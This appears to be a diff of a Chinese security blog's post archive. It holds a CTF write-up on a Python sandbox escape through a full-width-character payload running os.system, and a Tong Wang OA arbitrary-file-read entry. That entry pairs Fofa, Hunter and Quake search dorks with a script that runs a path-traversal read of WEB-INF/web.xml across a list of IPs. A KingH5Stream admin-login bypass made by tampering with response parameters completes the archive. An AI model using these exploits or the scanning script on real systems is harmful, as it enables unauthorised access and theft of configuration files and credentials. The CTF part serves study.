-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">        code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br></pre></td></tr></table></figure></div>
-<p>梳理下，在传进来的类型为text时，调用<strong>check_for_blacklisted_symbols()</strong>这个方法：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></div>
-<p>从黑名单里限制字符：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br></pre></td></tr></table></figure></div>
-<p>后续调用unidecode.unidecode()进行处理，将 Unicode 字符转换为最相似的
-ASCII 字符。</p>
-<p>所以这块可以绕一下，先gpt跑个程序：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_full_width</span>(<span class="params">text</span>):</span><br><span class="line">    full_width_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="comment"># 判断字符是否为半角字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">33</span> &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="number">126</span>:  <span class="comment"># 半角字符的 Unicode 范围</span></span><br><span class="line">            full_width_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) + <span class="number">0xFEE0</span>)  <span class="comment"># 转换为全角字符</span></span><br><span class="line">            full_width_text += full_width_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            full_width_text += char  <span class="comment"># 非半角字符保持不变</span></span><br><span class="line">    <span class="keyword">return</span> full_width_text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line"></span><br><span class="line">half_width_str = <span class="string">&quot;Hello, World! 123&quot;</span></span><br><span class="line">full_width_str = to_full_width(half_width_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始半角字符:&quot;</span>, half_width_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的全角字符:&quot;</span>, full_width_str)</span><br></pre></td></tr></table></figure></div>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672d7abbd29ded1a8cd24c8f.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>没问题，那先接着往下看，返回code，这块的处理结束了。</p>
-<p>回到/blockly_json路由，发现执行do()函数：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure></div>
-<p>简单来说就是通过把拼凑出的python代码写到hook_code后，进行第二个过滤，这个过滤没有ban掉os和system，但是长度有限制，用**__builtins.len
-= lambda x:1**去绕下：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;blocks&quot;</span>:&#123;<span class="string">&quot;languageVersion&quot;</span>:0,<span class="string">&quot;blocks&quot;</span>:[&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;text&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;azg=&#125;0JkK6nkl7VO]NMG&quot;</span>,<span class="string">&quot;x&quot;</span>:273,<span class="string">&quot;y&quot;</span>:141,<span class="string">&quot;fields&quot;</span>:&#123;<span class="string">&quot;TEXT&quot;</span>:<span class="string">&quot;＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ ｘ：０；ｐｒｉｎｔ（＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｌｓ＂））；＇&quot;</span>&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure></div>
-<p>后续还得提权，suid和dd提权直接跑https://gtfobins.github.io/就行了</p>
 ]]></content>
       <tags>
         <tag>竞赛复盘</tag>
@@ -606,6 +364,248 @@ alt="image.png"
 <figcaption aria-hidden="true">image.png</figcaption>
 </figure>
 <p>直接跑sqlmap</p>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tong Wang OA tooneAssistantAttachement File read</title>
+    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
+    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
+<p>​
+同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
+<ul>
+<li>Fofa：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Hunter：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Quake：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<h4 id="利用脚本">利用脚本</h4>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KingH5Stream admin login</title>
+    <url>/2024/11/08/beijignyakongkeyijifazhanyouxiangongsi/</url>
+    <content><![CDATA[<h2 id="漏洞位置">漏洞位置：</h2>
+<p>/#/login</p>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>北京亚控科技发展有限公司是一家工业自动化和信息化软件平台高科技企业。
+北京亚控科技发展有限公司KingH5Stream系统存在逻辑缺陷漏洞，攻击者可利用该漏洞登录管理员账户。</p>
+<h2 id="利用过程">利用过程</h2>
+<p>进入登陆界面： <img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d8c77d29ded1a8ce47ba3.png"
+                     
+alt="image.png" 
+                ></p>
+<p>用户名admin，密码随便填</p>
+<p>请求包： <img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d8c9bd29ded1a8ce49ab9.png"
+                     
+alt="image.png" 
+                ></p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d8cbad29ded1a8ce4cbfd.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>修改bStatus和strSession参数，将前者改为true，后者填个1，直接放包
+发现放包后系统请求了另一个包</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d8ce8d29ded1a8ce4ebaa.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>那串hash值应该就是管理员密码hash值，解不解出来无所谓，放包之后直接进入系统</p>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯2024-PyBlockly</title>
+    <url>/2024/11/08/qiangwangbei2024pyblockly/</url>
+    <content><![CDATA[<p>给源码的一道python题</p>
+<p>从程序入口开始看起：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br></pre></td></tr></table></figure></div>
+<p>只给了两个路由，那数据肯定是提交给了后者哇。仔细看看后者的处理逻辑就行。</p>
+<p>首先从请求中把咱们所提交的数据提取出来，然后在try里调用<strong>json_to_python()</strong>函数，查看请求包格式，抓一个print(0)的包：</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d7928d29ded1a8cd06d60.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>跟踪下看看函数逻辑：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> python_code</span><br></pre></td></tr></table></figure></div>
+<p>从咱们提交的数据里去提取下一级的blocks里的下一级的blocks中的第0位元素，也就是</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d79c3d29ded1a8cd13678.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>提取完这个数据之后，又调用了<strong>block_to_python()</strong>这个函数，跟进查看：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line">           </span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line">        </span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br></pre></td></tr></table></figure></div>
+<p>这个函数的话就是对咱们刚才所提取出来的type值进行if-elif-else的分析，以刚才传进来的数据包为例，如果传进来的类型为print时，定位到其中的文本域：</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d79e1d29ded1a8cd154bc.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>然后这块挺有意思的哈，他又调用了一次<strong>block_to_python()</strong>，也就是又进行了一次提取，但这次的域已经不是原来的域了：</p>
+<p>原来的域：</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d7a57d29ded1a8cd1d2a0.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>现在的域：</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d7a97d29ded1a8cd21fc0.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>这个时候再去定位提取type时提取到的就不是print而是math_number,后续就正常进行拼接命令输出，不过这里不是关键点，所以不深入跟踪。</p>
+<p>真正关键的是这段：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">        code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>梳理下，在传进来的类型为text时，调用<strong>check_for_blacklisted_symbols()</strong>这个方法：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></div>
+<p>从黑名单里限制字符：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>后续调用unidecode.unidecode()进行处理，将 Unicode 字符转换为最相似的
+ASCII 字符。</p>
+<p>所以这块可以绕一下，先gpt跑个程序：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_full_width</span>(<span class="params">text</span>):</span><br><span class="line">    full_width_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="comment"># 判断字符是否为半角字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">33</span> &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="number">126</span>:  <span class="comment"># 半角字符的 Unicode 范围</span></span><br><span class="line">            full_width_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) + <span class="number">0xFEE0</span>)  <span class="comment"># 转换为全角字符</span></span><br><span class="line">            full_width_text += full_width_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            full_width_text += char  <span class="comment"># 非半角字符保持不变</span></span><br><span class="line">    <span class="keyword">return</span> full_width_text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line"></span><br><span class="line">half_width_str = <span class="string">&quot;Hello, World! 123&quot;</span></span><br><span class="line">full_width_str = to_full_width(half_width_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始半角字符:&quot;</span>, half_width_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的全角字符:&quot;</span>, full_width_str)</span><br></pre></td></tr></table></figure></div>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672d7abbd29ded1a8cd24c8f.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>没问题，那先接着往下看，返回code，这块的处理结束了。</p>
+<p>回到/blockly_json路由，发现执行do()函数：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>简单来说就是通过把拼凑出的python代码写到hook_code后，进行第二个过滤，这个过滤没有ban掉os和system，但是长度有限制，用**__builtins.len
+= lambda x:1**去绕下：</p>
